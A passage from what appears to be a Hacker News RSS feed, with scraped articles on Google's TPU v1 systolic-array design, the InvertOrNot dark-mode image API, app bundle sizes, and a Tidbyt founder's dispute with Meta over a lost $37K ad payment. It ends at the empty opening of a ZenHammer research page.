multiplication will naturally emerge from the array.</p><p>The calculation can be represented in the following diagram. The squares in each corner represent a multiply / accumulate unit (MAC) that can perform a multiplication and addition operation.</p><p>In this diagram, the values in yellow are the inputs that are fed into the matrix from the top and the left. The light blue values are the partial sums that are stored. The dark blue values are the final results</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg" width="1456" height="1556" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1556,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:217775,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ddd4710-3a57-40cb-a427-947bb9a723de_1533x1638.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>.Let’s take it step by step.</p><blockquote><p><em>Step 1:</em></p><p>Values a11 and b11 are loaded into the top left multiply/accumulate unit (MAC). They are multiplied together and the result is stored.</p><p><em>Step 2:</em></p><p>Values a12 and b21 are loaded into the top left MAC. They are multiplied together and added to the previously calculated result. This gives the top left value of the results matrix.</p><p>Meanwhile, b11 is transferred to the top right MAC where it is multiplied by the newly loaded value a21 and the result is stored. Also, a11 is transferred to the bottom left MAC where it is multiplied by the newly loaded value b12, and the result is stored.</p><p><em>Step 3:</em></p><p>b21 is transferred to the top right MAC where it is multiplied by the newly loaded value a22 and the result is added to the previously stored result. Also, a12 is transferred to the bottom left MAC where it is multiplied by the newly loaded value b22, and the result is added to the previously stored result. In this step, we have calculated the top right and bottom left values of the results matrix.</p><p>Meanwhile, a12 and b21 are transferred to the bottom right MAC where they are multiplied and the result is stored.</p><p><em>Step 4:&nbsp;</em></p><p>Finally, a22 and b22 are transferred to the bottom right MAC where they are multiplied and the result is added to the previously stored value giving the bottom right value of the results matrix.</p><p>So the results of the matrix multiplication emerge down a moving ‘diagonal’ in the matrix of MACs.&nbsp;</p></blockquote><p>In our example, it takes 4 steps to do a 2 x 2 matrix multiplication, but only because some of the MACs are not utilized at the start and end of the calculation. In practice, a new matrix multiplication would start top left as soon as the MAC is free. As a result the unit is capable of a new matrix multiplication every two cycles.</p><p>This is a simplified representation of how a systolic array works and we’ve glossed over some of the details of the implementation of the systolic array in TPU v1. I hope that the principles of how this architecture works are clear though.</p><p>This is the simplest possible matrix multiplication but can be extended to bigger matrices with larger arrays of multiplication units.</p><p>The key point is that if data is fed into the systolic array in the right order then the flow of values and results through the system will ensure that the required results emerge from the array over time.</p><p>Crucially there is no need to store and fetch intermediate results from a ‘main memory’ area. Intermediate results are automatically available when needed due to the structure of the matrix multiply unit and the order in which inputs are fed into the unit.</p><p>Of course, the matrix multiply unit does not sit in isolation and the simplest presentation of the complete system is as follows:</p><p><span>The first thing to note is that TPUv1 relies on communication with the host computer over a </span><a href="https://en.wikipedia.org/wiki/PCI_Express" rel="">PCIe</a><span> (high speed serial bus) interface. It also has direct access to its own DDR3 Dynamic RAM storage.</span></p><p>We can expand this to a more detailed presentation of the design:</p><p>Let’s pick some key elements from this presentation of the design, starting at the top and moving (broadly) clockwise:</p><ul><li><p><strong>DDR3 DRAM / Weight FIFO:</strong><span> Weights are stored in DDR3 RAM chips connected to the TPU v1 via DDR3-2133 interfaces. Weights are ‘pre-loaded’ onto these chips from the host computer’s memory via PCIe and can then be transferred into the ‘Weight FIFO’ memory ready for use by the matrix multiply unit.</span></p></li><li><p><strong>Matrix Multiply Unit: </strong><span>This is a ‘systolic’ array with 256 x 256 matrix multiply/accumulate units that is fed by 256 ‘weight’ values from the top and 256 data inputs from the left.</span></p></li><li><p><strong>Accumulators:</strong><span> The results emerge from the systolic matrix unit at the bottom and are stored in ‘accumulator’ memory storage.</span></p></li><li><p><strong>Activation: </strong><span>The activation functions described in the neural network above are applied here.</span></p></li><li><p><strong>Unified Buffer / Systolic Data Setup: </strong><span>The results of applying the activation functions are stored in a ‘unified buffer’ memory where they are ready to be fed back as inputs to the Matrix Multiply Unit to calculate the values needed for the next layer.</span></p></li></ul><p>So far we haven’t specified the nature of the multiplications performed by the matrix multiply unit. TPU v1 performs 8-bit x 8-bit integer multiplications, making use of quantization to avoid the need for more die-area-hungry floating-point calculations.</p><p>The TPU v1 uses a CISC (Complex Instruction Set Computer) design with around only about 20 instructions. It’s important to note that these instructions are sent to it by the host computer over the PCIe interface, rather than being fetched from memory.</p><p>The five key instructions are as follows:</p><p><em><strong>Read_Host_Memory</strong></em></p><p>Reads input values from the host computer’s memory into the Unified Buffer over PCIe.</p><p><em><strong>Read_Weights</strong></em></p><p>Read weights from the weight memory into the Weight FIFO. Note that the weight memory will already have been loaded with weights read from the computer’s main memory over PCIe.</p><p><em><strong>Matrix_Multiply / Convolve</strong></em></p><p>From the paper this instruction</p><blockquote><p>… causes the Matrix Unit to perform a matrix multiply or a convolution from the Unified Buffer into the Accumulators. A matrix operation takes a variable-sized B*256 input, multiplies it by a 256x256 constant weight input, and produces a B*256 output, taking B pipelined cycles to complete.</p></blockquote><p>This is the instruction that implements the systolic array matrix multiply. It can also perform convolution calculations needed for Convolutional Neural Networks.</p><p><em><strong>Activate</strong></em></p><p>From the paper this instruction</p><blockquote><p>Performs the nonlinear function of the artificial neuron, with options for ReLU, Sigmoid, and so on. Its inputs are the Accumulators, and its output is the Unified Buffer.</p></blockquote><p><span>If we go back to our simple neural network model the values in the hidden layers are the result of applying an ‘activation function’ to the sum of the weights multiplied by the inputs. </span><a href="https://en.wikipedia.org/wiki/Rectifier_(neural_networks)" rel="">ReLU</a><span> and </span><a href="https://en.wikipedia.org/wiki/Sigmoid_function" rel="">Sigmoid</a><span> are two of the most popular activation functions. Having these implemented in hardware will have provided a useful speed-up in the application of the activation functions.</span></p><p><em><strong>Write_Host_Memory</strong></em></p><p>Writes results to the host computer’s memory from the Unified Buffer over PCIe.</p><p>It’s probably worth pausing for a moment to reflect on the elegance of these five instructions in providing an almost complete implementation of inference in the TPU v1. In pseudo-code, we could describe the operation of the TPU v1 broadly as follows:</p><pre><code>Read_Host_Memory
Read_Weights
Loop_Start
    Matrix_Multiply
    Activate
Loop_End
Write_Host_Memory</code></pre><p>It’s also useful to emphasize the importance of the systolic unit in making this possible and efficient. As described by the TPU v1 team (and as we’ve already seen):</p><blockquote><p>.. the matrix unit uses systolic execution to save energy by reducing reads and writes of the Unified Buffer …. It relies on data from different directions arriving at cells in an array at regular intervals where they are combined. … data flows in from the left, and the weights are loaded from the top. A given 256-element multiply-accumulate operation moves through the matrix as a diagonal wavefront.</p></blockquote><p>The TPU v1’s hardware would be of little use without a software stack to support it. Google developed and used Tensorflow so creating ‘drivers’ so that Tensorflow could work with the TPU v1 was the main step needed.&nbsp;</p><blockquote><p>The TPU software stack had to be compatible with those developed for CPUs and GPUs so that applications could be ported quickly to the TPU. The portion of the application run on the TPU is typically written in TensorFlow and is compiled into an API that can run on GPUs or TPUs.</p><p>Like GPUs, the TPU stack is split into a User Space Driver and a Kernel Driver. The Kernel Driver is lightweight and handles only memory management and interrupts. It is designed for long-term stability. The User Space driver changes frequently. It sets up and controls TPU execution, reformats data into TPU order, translates API calls into TPU instructions, and turns them into an application binary.</p></blockquote><p>As we saw in our earlier post, the TPU v1 was fabricated by TSMC using a relatively ‘mature’ 28nm TSMC process. Google has said that the die area is less than half the die area of the Intel Haswell CPU and Nvidia’s K80 GPU chips, each of which was built with more advanced processes, that Google was using in its data centers at this time.&nbsp;</p><p>We have already seen how simple the TPU v1’s instruction set was, with just 20 CISC instructions. The simplicity of the ISA leads to a very low ‘overhead’ in the TPU v1’s die for decoding and related activities with just 2% of the die area dedicated to what are labeled as ‘control’.</p><p>By contrast, 24% of the die area is dedicated to the Matrix Multiply Unit and 29% to the ‘Unified Buffer’ memory that stores inputs and intermediate results.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg" width="792" height="820" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:820,&quot;width&quot;:792,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:188413,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd012f995-c456-4400-bfb5-7b7279509335_792x820.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>At this point, it’s useful to remind ourselves that the TPU v1 was designed to make inference - that is the use of already trained models in real-world services provided at Google’s scale - more efficient. It was not designed to improve the speed or efficiency of training. Although they have some features in common inference and training provide quite different challenges when developing specialized hardware.</p><p>So how did the TPU v1 do?</p><p>In 2013 the key comparisons for the TPU v1 were with Intel’s Haswell CPU and Nvidia’s K80 GPU.</p><ul><li><p>TPU v1 has 25 times as many MACs and 3.5 times as much on-chip memory as the K80 GPU.</p></li><li><p>The TPU v1 is about 15X - 30X faster at inference than the K80 GPU and the Haswell CPU.</p></li></ul><p>And crucially the TPU v1 was much more energy efficient that GPUs:</p><ul><li><p>The relative incremental-performance/Watt of the TPU v1 is to 25 to 29 times that of the GPU.</p></li></ul><p>In the first post on the TPU v1, we focused on the fact that an organization like Google could marshal the resources to build the TPU v1 quickly.</p><p>In this post we’ve seen how the custom architecture of the TPU v1 was crucial in enabling it to generate much better performance with much lower energy use than contemporary CPUs and GPUs.</p><p>The TPU v1 was only the start of the story. TPU v1 was designed quickly and with the sole objective of making inference faster and more power efficient. It had a number of clear limitations and was not designed for training.  Both inside and outside Google firms would soon start to look at how TPU v1 could be improved. We’ll look at some of its successors in later posts.</p><p>After the paywall, a small selection of further reading and viewing on Google’s TPU v1.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Invertornot.com – API to enhance your images in dark-mode (161 pts)]]></title>
            <link>https://invertornot.com</link>
            <guid>39821632</guid>
            <pubDate>Mon, 25 Mar 2024 21:49:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://invertornot.com">https://invertornot.com</a>, See on <a href="https://news.ycombinator.com/item?id=39821632">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
        <p>
            Make your app's dark-mode smarter with InvertOrNot. Our API predicts if an image should be inverted for
            optimal
            dark-mode rendering. <br>
            This API is free, and is open source (both the code and the weights of the model are <a href="https://github.com/mattismegevand/invertornot">available</a>).
        </p>

        <p><img src="https://invertornot.com/static/examples.png" width="100%" alt="Example of outputs"></p><h4>Try it out</h4>
        <p>Upload an image to see InvertOrNot what transformation it would apply to it.</p>
        

        <h4>Background</h4>
        <p>
            Despite dark-mode's popularity, images often aren't automatically adapted to fit it.
            The conservative approach is to reduce the brightness of the image, which can degrade it significantly.
            Inverting the image can be a better solution, but it can't be applied to all images (see the poor Queen
            Victoria).<br>
            Using our API you can make your website more pleasant to use in dark-mode, without having to manually adapt
            each image.
        </p>

        <h4>How does it work?</h4>
        <p>The API works by finetuning an <a href="https://arxiv.org/abs/1905.11946">EfficientNet</a> model on a custom
            dataset using PyTorch. By using deep learning we are able to
            have a
            much more reliable approach to solve this problem, the only alternative being heuristics.</p>

        <h4>How can I use it?</h4><p>
        Documentation is available <a href="https://invertornot.com/docs/">here</a>. If possible cache or store the results provided by the API
        to avoid unnecessary calls.
        </p><table>
            <thead>
                <tr>
                    <th>Endpoint</th>
                    <th>Method</th>
                    <th>Input</th>
                    <th>Output</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><code>/api/file</code></td>
                    <td><code>POST</code></td>
                    <td>List of image files</td>
                    <td>List of <code>{invert, sha1, error}</code> for each file.</td>
                </tr>
                <tr>
                    <td><code>/api/url</code></td>
                    <td><code>POST</code></td>
                    <td>List of image URLs</td>
                    <td>List of <code>{invert, sha1, error, url}</code> for each URL.</td>
                </tr>
                <tr>
                    <td><code>/api/sha1</code></td>
                    <td><code>POST</code></td>
                    <td>List of SHA-1 hashes</td>
                    <td>List of <code>{invert, sha1, error}</code> for each SHA-1.</td>
                </tr>
            </tbody>
        </table>

        <p>
        Example of a request:
        </p><pre>            <code>
                curl -X 'POST' \
                  'https://invertornot.com/api/url' \
                  -H 'accept: application/json' \
                  -H 'Content-Type: application/json' \
                  -d '[
                  "https://upload.wikimedia.org/wikipedia/commons/e/e3/Queen_Victoria_by_Bassano.jpg"
                ]'
            </code>
        </pre><p>
        Response:
        </p><pre>            <code>
                [
                  {
                    "invert": 0,
                    "sha1": "da487e2e9855362b4a5f4fdb531c55ae47ac6e1b",
                    "error": "",
                    "url": "https://upload.wikimedia.org/wikipedia/commons/e/e3/Queen_Victoria_by_Bassano.jpg"
                  }
                ]
            </code>
        </pre><p>

        If you've never adapted images for dark-mode, here's a quick example of what the CSS can look like:
        </p><ul>
            <li>no inversion: <code>filter: grayscale(50%);</code></li>
            <li>inversion: <code>filter: grayscale(50%) invert(100%) brightness(95%) hue-rotate(180deg);</code></li>
        </ul><p>
        Feel free to tweak these based on your dark mode setup.

        </p><h4>Goal</h4>
        <p>
            InvertOrNot is a public demonstration and proof of concept of using a NN classifier to choose how to
            handle images
            in dark-mode.
        </p>

        <h4>Support</h4>
        <p>
            InvertOrNot offers no warranties or guaranties and is done on a best-effort basis.
            If you need reliable or large-scale inversion APIs, I strongly recommend you download the FLOSS code and
            model and run your own instance. The model is lightweight (16MB) and can be run on a CPU (≈ 100ms using ONNX
            Runtime).
        </p>

        <h4>Side note</h4>
        <p>
            Images may be retained for training purposes. Should you prefer your images not be saved, hosting your own
            instance
            is recommended. Additionally, it's important to note that these images will not be distributed; they are
            solely used
            for training purposes
        </p>

        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why is the LinkedIn app almost half a gig? (150 pts)]]></title>
            <link>https://threadreaderapp.com/thread/1772350918534582525.html</link>
            <guid>39820649</guid>
            <pubDate>Mon, 25 Mar 2024 20:01:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://threadreaderapp.com/thread/1772350918534582525.html">https://threadreaderapp.com/thread/1772350918534582525.html</a>, See on <a href="https://news.ycombinator.com/item?id=39820649">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Last week we wrote how <a href="https://twitter.com/peacock">@peacock</a> reduced app size &amp; app launch after moving from RN to native</p><p>

By beautiful chance, another streaming app did the same this week. Did the same effects occur? Well, yes, no &amp; it depends</p><p>

🧵 Breaking down HBO's new Max app<br>
<span><span><blockquote data-conversation="none" data-align="center" data-dnt="true"><a href="https://twitter.com/Baconbrix/status/1661058851054010392">https://twitter.com/Baconbrix/status/1661058851054010392</a></blockquote></span></span></p></div><div><p>So, HBO Max is now Max. New app, new bundle id, new logo, &amp; entirely new codebase. Let's start by comparing the iOS size and architecture</p><p>

iOS<br>
HBO Max (old app): v53.20.1 - 60.4 MB install size<br>
Max (new app): v1.0.1 - 108.8 MB</p><p>

The new iOS app is 48.4 MB (~80%) bigger</p></div><div><p>Here's our X-Ray for the old HBO Max app. It consists of</p><p>

~18 MB of images (top left)<br>
~11 MB main.jsbundle (top right)<br>
~15 MB main binary (bottom left)</p><p>

The rest are misc frameworks, plugins, bundles, fonts, etc. <span><a href="https://pbs.twimg.com/media/Fw2EKZwaEAIjSTJ.jpg" target="_blank"><img alt="Treemap of the HBO Max iOS ..." src="https://threadreaderapp.com/images/1px.png" data-src="https://pbs.twimg.com/media/Fw2EKZwaEAIjSTJ.jpg"></a></span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta takes $40K, holds our business ransom (160 pts)]]></title>
            <link>https://tidbyt.com/blogs/tidbyt/meta-takes-40k-holds-our-business-ransom</link>
            <guid>39819903</guid>
            <pubDate>Mon, 25 Mar 2024 18:46:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tidbyt.com/blogs/tidbyt/meta-takes-40k-holds-our-business-ransom">https://tidbyt.com/blogs/tidbyt/meta-takes-40k-holds-our-business-ransom</a>, See on <a href="https://news.ycombinator.com/item?id=39819903">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<meta charset="utf-8">

<p><strong>tl;dr:</strong> Meta charged my credit card $40K for advertising, somehow lost track of the money, and has now suspended our account unless we wire them $40K more.</p>
<hr>
<p>When you’re running a small business, you always hear horror stories from fellow founders about dealing with large platform companies like Meta, Google, Amazon, and Apple. Depending on your business, working with these platforms ranges from “convenient” to “existentially necessary”.</p>
<p>In our case, <a href="https://tidbyt.com/">Tidbyt</a> is a very visual consumer product, making it a great fit for Instagram. Our potential customers are on Instagram and Facebook, so we really have to be there too. In fact, since launch, we’ve paid Meta literal millions of dollars for advertising on these platforms.</p>
<p>Given the size of our account, and the fact that I’m a former Facebook employee, we figured things would be fine — and they more or less have been. Ad performance has declined a bit, but hasn’t it for everyone? It also bothered me that we’ve never been assigned an account manager or given a phone number to call for issues, but that seems to be an extremely standard experience as well.</p>
<p>Once our account got large enough, Meta switched us to monthly invoicing and we continued to have a good working relationship for a couple years. Until…</p>
<h2>Pay by credit card? Sure, why not.</h2>
<p>Some time last year, Meta added the option to pay invoices by credit card. It’s not rocket science, you just click “Pay” in their billing portal and enter your credit card. It gets charged.</p>
<p>We tried the credit card payment option for the first time last month. My card was charged, the invoice state updated to “Processing”. Strangely, the portal didn’t provide a PDF receipt or anything, but Meta’s ad platform is known to be fairly buggy.</p>
<p>A little while later, we got an email from Meta with a vaguely scary message:</p>
<blockquote>Your account is 16 days past due and is at risk of being placed on a collections hold. Payment instructions are included at the bottom of each invoice. If you've recently paid this balance, please send payment remittance advice to <a href="https://tidbyt.com/cdn-cgi/l/email-protection#d2a2b3abbfb7bca692b4b0fcb1bdbf"><span data-cfemail="fa8a9b83979f948eba9c98d4999597">[email&nbsp;protected]</span></a> so we can make sure to credit your account promptly.</blockquote>
<p>Bummer, but probably just a mix up? Checking my card, it had <em>definitely</em> been charged, and the charge had even been finalized. We responded with a screenshot of the Amex statement and once again figured that was it.</p>
<p>But <strong>8 days later</strong>, we got another email from a “collections analyst”, and it became pretty clear that the collections analyst didn’t even realize that credit card payments were possible. They asked for things like an <em>“MT103 document”</em> and <em>“payment advise document”</em>. Those are the kinds of receipts you get when you send a wire transfer from a bank, but obviously we didn’t have them since I paid via credit card through Meta’s own website.</p>
<p>This dance continued about once a week, with a new email from Meta, promises from the analyst to call us by phone (they never did), and a new response from us with the credit card statement. By this point we’d actually even settled the credit card bill with Amex.</p>
<p>The last we’d heard from Meta was a week ago, and I sent over the final PDF transaction statement from Amex.&nbsp;</p>
<p><img src="https://cdn.shopify.com/s/files/1/0426/4768/3235/files/statement_a86b2107-163f-4a47-b11c-d0cb2ab6ddc8_1024x1024.png?v=1711391873"></p>
<p><em>Ironic how the credit card statement includes a link to <a href="http://metacareers.com/">metacareers.com</a> 🙃&nbsp;And nope, that phone number doesn’t go anywhere.</em></p>
<h2>I know people at Meta, right?</h2>
<p>Fearing the worst, I personally started reaching out to alumni and employees at Facebook. Like come on, I worked there for a couple years, y’all know me and we can get this figured out, right? Definitely nepotism, but when the entire business is on the line, I’m willing to pull every available lever.</p>
<p>Sadly the only actionable advice we got was to open a case with Meta’s business support. I did that, and the chat support rep was clearly not able to deal with this kind of issue. The rep gave me a link and asked me to fill out a support form to reach support… but it was the exact same form I’d just filled out to start a chat with <em>them</em>.</p>
<p>When that didn’t work, they asked me to file a bug/feedback report. I filed the bug report, but those reports clearly state “we&nbsp;can't personally&nbsp;respond to everyone”. Totally the wrong channel.</p>
<p><img alt="" src="https://cdn.shopify.com/s/files/1/0426/4768/3235/files/bug-report_600x600.png?v=1711391994"></p>
<p>And of course, the support case I originally opened is now closed as “completed”.</p>
<h2>Your Meta ad account has been disabled.</h2>
<p>This morning at 3 AM, we got an email saying that our account has been disabled:</p>
<blockquote>
<p>Dear Tidbyt, Inc.,</p>
<p>Your Meta ad account was placed on a collections hold for overdue invoices totaling USD 37,216.17.</p>
<p>Your account has been disabled and is currently inactive.</p>
<p>To reactive your credit line, we must receive payment for the past due balance.</p>
</blockquote>
<p>I responded one more time, and got the same response from the same collections analyst:</p>
<blockquote>
<p>We apologize for the inconvenience caused, upon checking from our side we haven't received the payment that you have made via Credit Card. We request you check with your bank side and give me an update on the payment status.</p>
</blockquote>
<p>But again, there’s nothing more to check on our end since we paid through Meta’s own portal. When we paid via credit card, Meta’s payment processor charged the card for $37K and would have sent that money to Meta’s bank account.</p>
<p><strong>So Meta is sitting on $37K, but has disabled our account because they can’t seem to be bothered to find it. If we want to reactivate our account, we have to double-pay and directly wire transfer them another $37K. Otherwise we’re dead in the water.</strong></p>
<h2>This kills the business.</h2>
<p>I get the inherent risk of relying on a third-party platform for a large chunk of your business, I really do. It keeps me up at night and we’ve definitely invested in alternatives where possible.</p>
<p>But in a lot of ways, Meta <em>is</em> the marketplace. Running a consumer retail business without an Instagram presence… it’s kind of like trying to build a consumer phone app without working with Apple and Google. Sure, you could try to reinvent the entire ecosystem and marketplace with unlimited time &amp; money, but even Amazon failed when they tried that.</p>
<p>What makes it even worse for us is that we base our manufacturing and inventory on sales forecasts. It’s only been 12 hours since our Instagram and Facebook&nbsp;ad accounts were blipped, but we’re already seeing a drop in traffic and sales. We’ll certainly try to course correct, but it’s going to be very, very difficult.</p>
<h2>“Just do a chargeback.”</h2>
<p>One advantage of having paid with a credit card is that we could dispute the charge with Amex. This is a nuclear option since it has a number of risks:</p>
<ol>
<li>
<strong>Will we win the dispute?</strong> Once we dispute the charge, the bank has months to investigate and render a final decision. There’s always a chance that they could side with Meta, and then we’d never see that money back. In the meantime we would still have to pay Meta another $37K to reactivate the account.</li>
<li>
<strong>Will Meta permanently close our accounts?</strong> If we file a chargeback, then $37K will immediately be withdrawn by the credit card processor from Meta’s account. I promise you, somebody at Meta is going to notice $40K <em>leaving</em> their account, and I have no idea how they would respond. They could permanently close our ad accounts, suspend our organic accounts, or even suspend our personal accounts. No way to know.</li>
</ol>
<h2>Fire and motion.</h2>
<p>Over 20 years ago, Joel Spolsky wrote a great essay that’s always stuck with me, <em><a href="https://www.joelonsoftware.com/2002/01/06/fire-and-motion/">Fire And Motion</a></em>. In it, he talks about “cover fire”:</p>
<blockquote>
<p>If you are moving forward, writing code and fixing bugs constantly, time is on your side. Watch out when your competition fires at you. Do they just want to force you to keep busy reacting to their volleys, so you can’t move forward?</p>
</blockquote>
<p>When large platform companies throw us for loops like these, it’s a form of cover fire. Instead of spending the day moving our company forward, I’m instead dealing with this curveball that Meta has thrown at us.</p>
<p>Obviously, there isn’t somebody at Meta who is intentionally trying to make our lives difficult because they see Tidbyt as some sort of strategic threat (lol). But organizations will eventually evolve to reproduce the conditions that favor their continued existence and growth.</p>
<p>When Meta has a payments issue that isn’t anyone’s priority to solve, when Google Cloud decides to deprecate another product with short notice, when Apple throws out new App Store rules… these are all cover fire. Even if the underlying intentions are genuine, the effect is that the rest of us spend more time reacting and less time innovating.</p>
<p>I’m not sure what the answer is, but man, do I really wish I hadn’t tried to pay that invoice with a credit card.</p>
<p><a href="https://news.ycombinator.com/item?id=39819903"><em>(discuss on Hacker News)</em></a></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ZenHammer: Rowhammer Attacks on AMD Zen-Based Platforms (312 pts)]]></title>
            <link>https://comsec.ethz.ch/research/dram/zenhammer/</link>
            <guid>39819599</guid>
            <pubDate>Mon, 25 Mar 2024 18:20:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://comsec.ethz.ch/research/dram/zenhammer/">https://comsec.ethz.ch/research/dram/zenhammer/</a>, See on <a href="https://news.ycombinator.com/item?id=39819599">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
			<!-- If has sidebar start -->
	<main id="main">
		<div>
			<!-- If has sidebar end -->
							<article id="post-1249" class="page">
										<!-- .entry-header -->
					<div>
						
